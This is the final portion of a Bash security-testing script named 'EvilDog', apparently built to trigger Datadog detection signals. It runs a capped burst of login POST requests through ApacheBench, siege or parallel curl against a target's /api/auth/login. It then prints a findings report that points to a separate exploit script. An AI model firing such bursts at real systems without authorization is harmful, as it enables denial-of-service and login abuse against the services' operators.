REQUESTS=$(clamp_int "$TRAFFIC_BURST_REQUESTS" "$TRAFFIC_BURST_MAX_REQUESTS" 80)
CONCURRENCY=$(clamp_int "$TRAFFIC_BURST_CONCURRENCY" 50 10)
DURATION=$(clamp_int "$TRAFFIC_BURST_SECONDS" 60 20)
BURST_POST="$OUT/traffic-burst-login-$RUN_ID.json"
BURST_STATUS="$OUT/traffic-burst-status-$RUN_ID.txt"
: > "$BURST_STATUS"
printf '{"cpf":"00000000000","senha":"evildog-burst-%s"}\n' "$RUN_ID" > "$BURST_POST"

log "Target: POST https://$TARGET/api/auth/login"
log "requests=$REQUESTS concurrency=$CONCURRENCY duration_cap=${DURATION}s"
log "User-Agent: EvilDog-TrafficBurst/$RUN_ID"

if command -v ab >/dev/null 2>&1; then
  log "Using Kali tool: ab (ApacheBench) with strict caps"
  run_limited "$((DURATION + 10))" ab -k -n "$REQUESTS" -c "$CONCURRENCY" \
    -p "$BURST_POST" \
    -T "application/json" \
    -H "User-Agent: EvilDog-TrafficBurst/$RUN_ID" \
    -H "X-EvilDog-Run: $RUN_ID" \
    -H "X-EvilDog-Attack: traffic_burst" \
    "https://$TARGET/api/auth/login" > "$OUT/traffic-burst-ab-$RUN_ID.txt" 2>&1 || true
  HTTP_REQUEST_COUNT=$((HTTP_REQUEST_COUNT + REQUESTS))
  grep -E "Complete requests|Failed requests|Requests per second|Non-2xx responses|Time taken" "$OUT/traffic-burst-ab-$RUN_ID.txt" 2>/dev/null | while read -r line; do
    log "$line"
  done
elif command -v siege >/dev/null 2>&1; then
  log "Using Kali tool: siege with strict caps"
  printf "https://%s/api/auth/login POST %s\n" "$TARGET" "$(cat "$BURST_POST")" > "$OUT/siege-urls-$RUN_ID.txt"
  run_limited "$((DURATION + 10))" siege -q -c "$CONCURRENCY" -t "${DURATION}S" \
    -H "Content-Type: application/json" \
    -H "User-Agent: EvilDog-TrafficBurst/$RUN_ID" \
    -H "X-EvilDog-Run: $RUN_ID" \
    -H "X-EvilDog-Attack: traffic_burst" \
    -f "$OUT/siege-urls-$RUN_ID.txt" > "$OUT/traffic-burst-siege-$RUN_ID.txt" 2>&1 || true
  HTTP_REQUEST_COUNT=$((HTTP_REQUEST_COUNT + REQUESTS))
  tail -12 "$OUT/traffic-burst-siege-$RUN_ID.txt" 2>/dev/null | while read -r line; do
    [ -n "$line" ] && log "$line"
  done
else
  log "ab/siege not found; using capped curl fallback"
  for ((i=1; i<=REQUESTS; i++)); do
    (
      code=$(curl -sk --connect-timeout "$CURL_CONNECT_TIMEOUT" --max-time 5 -o /dev/null -w "%{http_code}" \
        -A "EvilDog-TrafficBurst/$RUN_ID" \
        -H "Content-Type: application/json" \
        -H "X-EvilDog-Run: $RUN_ID" \
        -H "X-EvilDog-Attack: traffic_burst" \
        -d "{\"cpf\":\"00000000000\",\"senha\":\"burst-$RUN_ID-$i\"}" \
        "https://$TARGET/api/auth/login" 2>/dev/null || printf "000")
      printf "%s\n" "$code" >> "$BURST_STATUS"
    ) &
    HTTP_REQUEST_COUNT=$((HTTP_REQUEST_COUNT+1))
    if [ $((i % CONCURRENCY)) -eq 0 ]; then
      wait
    fi
    draw_progress_bar "$i" "$REQUESTS" "traffic burst controlado"
    sleep 0.03
  done
  wait
  printf "\r%-80s\r" " "
  sort "$BURST_STATUS" 2>/dev/null | uniq -c | while read -r count status; do
    log "HTTP $status: $count responses"
  done
fi

log_ok "Traffic burst complete — check Datadog for EvilDog-TrafficBurst/$RUN_ID"
add_vuln "MEDIUM" "Controlled Traffic Burst" "$REQUESTS capped requests sent for SIEM/AppSec DoS/rate-abuse signal" "MITRE T1499" "https://attack.mitre.org/techniques/T1499/"
datadog_cue "Traffic burst / possible DoS" "@http.useragent:*EvilDog-TrafficBurst* OR @http.request.headers.x-evildog-attack:traffic_burst" "Mostre volume por IP/UA e o signal customizado"
phase_end
section_end

# ══════════════════════════════════════════════════════════════
# RELATÓRIO FINAL
# ══════════════════════════════════════════════════════════════
write_recon_plan
sleep 0.3; clear; print_banner

TOTAL_TIME=$((SECONDS - START_TIME))
MINS=$((TOTAL_TIME / 60)); SECS=$((TOTAL_TIME % 60))

printf "${RED}${BOLD}"
printf "╔══════════════════════════════════════════════════════════════╗\n"
printf "║${NC}           ${RED}${BOLD}👻  E V I L D O G   R E P O R T  🕵️${RED}           ${RED}${BOLD}║\n"
printf "╠══════════════════════════════════════════════════════════════╣\n"
printf "║${NC}  ${DIM}Target  :${NC} ${GREEN}%-50s${RED}${BOLD}║\n" "https://$TARGET"
printf "║${NC}  ${DIM}Duration:${NC} ${GREEN}%-50s${RED}${BOLD}║\n" "${MINS}m${SECS}s"
printf "║${NC}  ${DIM}HTTP ops:${NC} ${GREEN}%-50s${RED}${BOLD}║\n" "$HTTP_REQUEST_COUNT"
printf "║${NC}  ${DIM}Plan    :${NC} ${GREEN}%-50s${RED}${BOLD}║\n" "$LATEST_RECON_PLAN"
printf "║${NC}  ${DIM}Time    :${NC} ${GREEN}%-50s${RED}${BOLD}║\n" "$(date '+%Y-%m-%d %H:%M:%S')"
printf "╠══════════════════════════════════════════════════════════════╣\n"
printf "║${NC}  ${RED}${BOLD}🚨  CRITICAL${NC}   ${YELLOW}%2d findings${NC}%-34s${RED}${BOLD}║\n" "$TOTAL_CRITICAL" ""
printf "║${NC}  ${YELLOW}⚠   HIGH${NC}       ${YELLOW}%2d findings${NC}%-34s${RED}${BOLD}║\n" "$TOTAL_HIGH" ""
printf "║${NC}  ${CYAN}◆   MEDIUM${NC}     ${YELLOW}%2d findings${NC}%-34s${RED}${BOLD}║\n" "$TOTAL_MEDIUM" ""
printf "║${NC}  ${GREEN}ℹ   INFO${NC}       ${YELLOW}%2d findings${NC}%-34s${RED}${BOLD}║\n" "$TOTAL_INFO" ""
printf "╚══════════════════════════════════════════════════════════════╝\n"
printf "${NC}\n"

IDX=1
for vuln in "${VULNS[@]}"; do
  SEV=$(echo "$vuln"    | cut -d'|' -f1)
  NAME=$(echo "$vuln"   | cut -d'|' -f2)
  DETAIL=$(echo "$vuln" | cut -d'|' -f3)
  CVE=$(echo "$vuln"    | cut -d'|' -f4)
  URL=$(echo "$vuln"    | cut -d'|' -f5)
  case $SEV in
    CRITICAL) ICON="🚨"; COLOR=$RED ;;
    HIGH)     ICON="⚠ "; COLOR=$YELLOW ;;
    MEDIUM)   ICON="◆ "; COLOR=$CYAN ;;
    INFO)     ICON="ℹ "; COLOR=$GREEN ;;
  esac
  printf "  ${DIM}[%02d]${NC} ${ICON}  ${COLOR}[%-8s]${NC}  ${WHITE}%s${NC}\n" "$IDX" "$SEV" "$NAME"
  printf "        ${DIM}→ %s${NC}\n" "$DETAIL"
  [ "$CVE" != "N/A" ] && printf "        ${MAGENTA}→ %s${NC}  ${DIM}%s${NC}\n" "$CVE" "$URL"
  IDX=$((IDX+1))
done

if [ ${#PHASE_TIMELINE[@]} -gt 0 ]; then
  printf "\n  ${YELLOW}${BOLD}Tempo por fase:${NC}\n"
  for item in "${PHASE_TIMELINE[@]}"; do
    LABEL=$(echo "$item" | cut -d'|' -f1)
    ELAPSED=$(echo "$item" | cut -d'|' -f2)
    printf "  ${DIM}•${NC} ${WHITE}%-34s${NC} %s\n" "$LABEL" "$(fmt_duration "$ELAPSED")"
  done
fi

printf "\n  ${RED}${BOLD}┌─ Next Steps ─────────────────────────────────────────────┐${NC}\n"
printf "  ${RED}${BOLD}│${NC}  ${GREEN}1.${NC} ${WHITE}Datadog ASM${NC} → Security → Application Security       ${RED}${BOLD}│${NC}\n"
printf "  ${RED}${BOLD}│${NC}     ${DIM}Expected signals: Log4Shell, SQLi, BruteForce${NC}        ${RED}${BOLD}│${NC}\n"
printf "  ${RED}${BOLD}│${NC}  ${GREEN}2.${NC} To exploit: ${YELLOW}./evildog-exploit.sh${NC}                    ${RED}${BOLD}│${NC}\n"
printf "  ${RED}${BOLD}│${NC}     ${DIM}Uses latest-recon-plan.json as attack plan${NC}            ${RED}${BOLD}│${NC}\n"
printf "  ${RED}${BOLD}└──────────────────────────────────────────────────────────┘${NC}\n\n"
printf "  ${DIM}Files saved in: ${GREEN}$OUT/${NC}\n\n"
printf "  ${DIM}Recon plan: ${GREEN}$LATEST_RECON_PLAN${NC}\n"
printf "  ${CYAN}👻${NC} ${WHITE}Recon finalizado.${NC} ${DIM}Abra o Datadog ASM e depois rode:${NC} ${YELLOW}./evildog-exploit.sh${NC}\n\n"
exit 0
